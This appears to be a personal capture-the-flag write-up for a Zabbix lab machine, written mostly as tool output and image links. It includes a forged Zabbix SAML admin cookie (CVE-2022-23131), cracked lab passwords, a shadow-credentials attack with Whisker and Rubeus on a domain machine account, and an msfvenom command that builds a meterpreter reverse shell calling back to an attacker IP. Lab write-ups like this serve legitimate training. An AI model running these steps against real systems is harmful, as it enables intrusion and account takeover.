# Information
- CTF Name: 
- CTF Level:
- CTF Description: 
- Date: 
- Platform: 
- Category: 
- IP: `192.168.210.13`

# Findings
### Credentials
`FoundCREDs`

### Flags
- `ZEPHYR{Abu51ng_d3f4ul7_Func710n4li7y_ftw}`
## External
### Enumeration
```
PORT    STATE SERVICE  REASON         VERSION
443/tcp open  ssl/http syn-ack ttl 64 nginx 1.18.0 (Ubuntu)
| tls-alpn:
|_  http/1.1
| http-robots.txt: 2 disallowed entries
|_/ /zabbix/".
| http-methods:
|_  Supported Methods: GET HEAD POST
| ssl-cert: Subject: commonName=monitor.zsm.local/organizationName=Zephyr Managed Services/stateOrProvinceName=London/countryName=GB/localityName=London/organizationalUnitName=IT/emailAddress=itsupport@zsm.local
| Issuer: commonName=zsm-ZPH-SVRCA01-CA/domainComponent=zsm
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-03-21T19:39:06
| Not valid after:  2032-03-18T19:39:06
| MD5:   0305:f283:731b:fda1:4a54:d983:e057:8b4a
| SHA-1: 0f34:e3b5:2b9b:964a:50bf:0ac2:dced:662b:29e0:5c4c
| -----BEGIN CERTIFICATE-----
| MIIF1zCCBL+gAwIBAgITXwAAAAUpbZqJ2/5fJAAAAAAABTANBgkqhkiG9w0BAQsF
| ADBJMRUwEwYKCZImiZPyLGQBGRYFbG9jYWwxEzARBgoJkiaJk/IsZAEZFgN6c20x
| GzAZBgNVBAMTEnpzbS1aUEgtU1ZSQ0EwMS1DQTAeFw0yMjAzMjExOTM5MDZaFw0z
| MjAzMTgxOTM5MDZaMIGeMQswCQYDVQQGEwJHQjEPMA0GA1UECBMGTG9uZG9uMQ8w
| DQYDVQQHEwZMb25kb24xIDAeBgNVBAoTF1plcGh5ciBNYW5hZ2VkIFNlcnZpY2Vz
| MQswCQYDVQQLEwJJVDEaMBgGA1UEAxMRbW9uaXRvci56c20ubG9jYWwxIjAgBgkq
| hkiG9w0BCQEWE2l0c3VwcG9ydEB6c20ubG9jYWwwggEiMA0GCSqGSIb3DQEBAQUA
| A4IBDwAwggEKAoIBAQDV9PHuszshhiDu9qGEODeRN9UcIIVd3coo/Er8qxbkP3ey
| 0twiNQ5HW7/bwnv9MM5N8VLY7MK5QfZw2lEhd2kVP83oci/GdKJ9MsKYan+6SuY6
| z6195xuLjSwrICDKUsv48MIk/6PQWxQUkHjtL+SZrbZQjGTmujaa+aBMnzdC9rm0
| a7V5EPrfPJOPuWolG7ax6n03q+znq2X1QDPWdYQNoYAgWkE+54aZJZvFzzlR4WhS
| LiSNEt1brhVNho284ienK0rTEkxsn2Njq05wk65uBayK6szSWcR94cSwy9JTf4sH
| CSXrae4fhexZacjR30aSW7tZNGLikTkJIWsB4rqPAgMBAAGjggJgMIICXDAdBgNV
| HQ4EFgQURXFfGvtIz8fvN52uKWY21wRhFjYwHwYDVR0jBBgwFoAUui9SQTQgaHow
| 772sfzDJhw6riRcwgdIGA1UdHwSByjCBxzCBxKCBwaCBvoaBu2xkYXA6Ly8vQ049
| enNtLVpQSC1TVlJDQTAxLUNBLENOPVpQSC1TVlJDQTAxLENOPUNEUCxDTj1QdWJs
| aWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxDTj1Db25maWd1cmF0aW9u
| LERDPXpzbSxEQz1sb2NhbD9jZXJ0aWZpY2F0ZVJldm9jYXRpb25MaXN0P2Jhc2U/
| b2JqZWN0Q2xhc3M9Y1JMRGlzdHJpYnV0aW9uUG9pbnQwgcIGCCsGAQUFBwEBBIG1
| MIGyMIGvBggrBgEFBQcwAoaBomxkYXA6Ly8vQ049enNtLVpQSC1TVlJDQTAxLUNB
| LENOPUFJQSxDTj1QdWJsaWMlMjBLZXklMjBTZXJ2aWNlcyxDTj1TZXJ2aWNlcyxD
| Tj1Db25maWd1cmF0aW9uLERDPXpzbSxEQz1sb2NhbD9jQUNlcnRpZmljYXRlP2Jh
| c2U/b2JqZWN0Q2xhc3M9Y2VydGlmaWNhdGlvbkF1dGhvcml0eTAOBgNVHQ8BAf8E
| BAMCBaAwPgYJKwYBBAGCNxUHBDEwLwYnKwYBBAGCNxUIht2iDILi1xeFoYUngoLo
| W4GtlRyBU4KL0geByZ5/AgFkAgEFMBMGA1UdJQQMMAoGCCsGAQUFBwMBMBsGCSsG
| AQQBgjcVCgQOMAwwCgYIKwYBBQUHAwEwDQYJKoZIhvcNAQELBQADggEBADqjrAB9
| bT4NYxLMTrGeCj2lxQROaKxi7FxThJMSlHgE0fhpsV7E1WX2CgRjNRxXjy94RXUw
| lS/yiZsTh7RjDDpeTz38SyxSQ8Je5x+Unnz92bBhNCS6T7FhNvcOWuir6oTQ4Dua
| g/tywnh8ZmESc+8jZE2/RSB07tozRfFt8NxMbT+zbIXrkgkp4gVysEM2254KszyN
| BomyNMOQYuKkK5trhW+A3XEYXI6JiwaaJFem+jG5UvdXVjHd0Vsblji2tHaJKJvy
| v1bVzaS+xdwGfxCTsyjLnHq2r/Bj+JCl4OJZ4fAobVs0Mo38UtiESC2z5qkIDLwf
| 8Rv29O+Glx+cGaY=
|_-----END CERTIFICATE-----
|_ssl-date: TLS randomness does not represent time
|_http-server-header: nginx/1.18.0 (Ubuntu)
|_http-favicon: Unknown favicon MD5: 0FBE700FD7D07EC8D30EF8B3AC261484
|_http-title: Zabbix
| tls-nextprotoneg:
|_  http/1.1

```
![](https://i.imgur.com/2P1UP7A.png)
https://github.com/Vulnmachines/Zabbix-CVE-2022-23131
https://github.com/Mr-xn/cve-2022-23131
![](https://i.imgur.com/avH3nEK.png)
```
eyJzYW1sX2RhdGEiOiB7InVzZXJuYW1lX2F0dHJpYnV0ZSI6ICJhZG1pbiJ9LCAic2Vzc2lvbmlkIjogImZlYTYyYzNlMmFmMDU1Mjk5NGRiM2I3OTExMGE3Y2U4IiwgInNpZ24iOiAiSWV5Wk1HTkZiYWpiRDlwNmliTUZxNEhXblNRMzFLRUFQUlZ1c1JDVmQ2RTY2dFBLci90ekJQWDRGZmNuMC9MOUltV1NrMEx4WTVoZHBXQlpkbDZacWc9PSJ9
```
![](https://i.imgur.com/18pi8ya.png)
![](https://i.imgur.com/EqDG2J1.png)
![](https://i.imgur.com/OdoqR9T.png)
![](https://i.imgur.com/mMGpi9Q.png)
### Gaining Access
![](https://i.imgur.com/z8jaAUz.png)

## Internal
### Enumeration
![](https://i.imgur.com/F8m4sW5.png)
![](https://i.imgur.com/qpt2Dxh.png)
![](https://i.imgur.com/jipjZBV.png)
![](https://i.imgur.com/3hknIuH.png)
![](https://i.imgur.com/PrYhnKl.png)
- ` zabbix : rDhHbBEfh35sMbkY `
- We Got marcus hash from the database and when we crack it ` marcus : !QAZ2wsx`
![](https://i.imgur.com/FL2gfd4.png)
- The user has `AddkeyCredentialLink` - we an work with shadowcredentials to get password.
```powershell
C:\> .\Whisker.exe add /target:ZPH-SVRMGMT1$
[*] No path was provided. The certificate will be printed as a Base64 blob
[*] No pass was provided. The certificate will be stored with the password LTujXugT1RwTkPSO
[*] Searching for the target account
[*] Target user found: CN=ZPH-SVRMGMT1,CN=Computers,DC=zsm,DC=local
[*] Generating certificate
[*] Certificate generaged
[*] Generating KeyCredential
[*] KeyCredential generated with DeviceID 71a48933-fcb2-40a3-a5d8-10b2fe14fc12
[*] Updating the msDS-KeyCredentialLink attribute of the target object
[+] Updated the msDS-KeyCredentialLink attribute of the target object
[*] You can now run Rubeus with the following syntax:

Rubeus.exe asktgt /user:ZPH-SVRMGMT1$ /certificate:MIIJ2AIBAzCCCZQGCSqGSIb3DQEHAaCCCYUEggmBMIIJfTCCBhYGCSqGSIb3DQEHAaCCBgcEggYDMIIF/zCCBfsGCyqGSIb3DQEMCgECoIIE/jCCBPowHAYKKoZIhvcNAQwBAzAOBAhhNphvFjj5EgICB9AEggTYhA0QOTN+GmUO7Bq868+x8kZgdBvYNPki

```
- Now am the machine, so i have the machines power, The machine can add members to `general memeber`, then i can access the user jamie
- ![](https://i.imgur.com/Lg5mUyA.png)
 - Boom
![](https://i.imgur.com/Lgfh1nn.png)
```
~/C/H/P/z/I/ZABBIX > 10.10.14.3 $ msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=10.10.14.3 LPORT=445 -f elf -o rex.bin
[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 123 bytes
Final size of elf file: 207 bytes
Saved as: rex.bin

error finding the group identity 'CA Managers' : Exception calling "FinfByidentity" with "2" Arguments : "An Operation error occurred."
```
![](https://i.imgur.com/tbw8jGt.png)

### Gaining Access


### Maintaining Access


# Random Notes